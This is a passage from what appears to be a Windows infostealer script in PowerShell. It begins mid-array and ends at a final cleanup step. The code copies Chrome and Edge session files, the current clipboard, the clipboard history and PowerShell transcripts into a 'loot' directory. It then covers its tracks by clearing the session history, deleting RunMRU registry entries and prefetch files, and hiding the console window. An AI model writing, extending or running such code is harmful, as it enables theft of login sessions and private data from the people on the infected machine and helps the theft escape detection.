    @{ Path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Sessions"; Name = "chrome_sessions" },
    @{ Path = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Sessions"; Name = "edge_sessions" }
)
foreach ($sp in $sessionPaths) {
    if (Test-Path $sp.Path) {
        Copy-Item $sp.Path "$tokenDir\$($sp.Name)" -Recurse -Force 2>$null
    }
}

# ═══════════════════════════════════════════════════════════════════════
# PHASE 13: CLIPBOARD HISTORY + TRANSCRIPT LOGS
# ═══════════════════════════════════════════════════════════════════════

$clipDir = "$LOOT_DIR\clipboard"
New-Item -ItemType Directory -Path $clipDir -Force | Out-Null

try {
    Add-Type -AssemblyName System.Windows.Forms
    $clipText = [System.Windows.Forms.Clipboard]::GetText()
    if ($clipText) {
        $clipText | Out-File "$clipDir\current_clipboard.txt" -Encoding utf8
    }
} catch { }

$clipHistoryPath = "$env:LOCALAPPDATA\Microsoft\Windows\Clipboard"
if (Test-Path $clipHistoryPath) {
    Copy-Item $clipHistoryPath "$clipDir\clipboard_history" -Recurse -Force 2>$null
}

$transcriptPaths = @(
    "$env:USERPROFILE\Documents\PowerShell_transcript*",
    "$env:USERPROFILE\Documents\*transcript*",
    "C:\Transcripts\*"
)
foreach ($tp in $transcriptPaths) {
    $files = Get-ChildItem $tp -File 2>$null
    foreach ($f in $files) {
        Copy-Item $f.FullName "$clipDir\$($f.Name)" -Force 2>$null
    }
}

# ═══════════════════════════════════════════════════════════════════════
# PHASE 14: CLEANUP
# ═══════════════════════════════════════════════════════════════════════

# Clear PowerShell history for this session
Clear-History -ErrorAction SilentlyContinue

# Remove recent run dialog entry
Remove-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -Force 2>$null

# Clear prefetch for this script
$prefetchFiles = Get-ChildItem "C:\Windows\Prefetch" -Filter "POWERSHELL*" -ErrorAction SilentlyContinue
# (can't delete without admin but try anyway)
$prefetchFiles | Remove-Item -Force 2>$null

# Final: remove console window evidence
[C.W]::ShowWindow($h, 0) | Out-Null
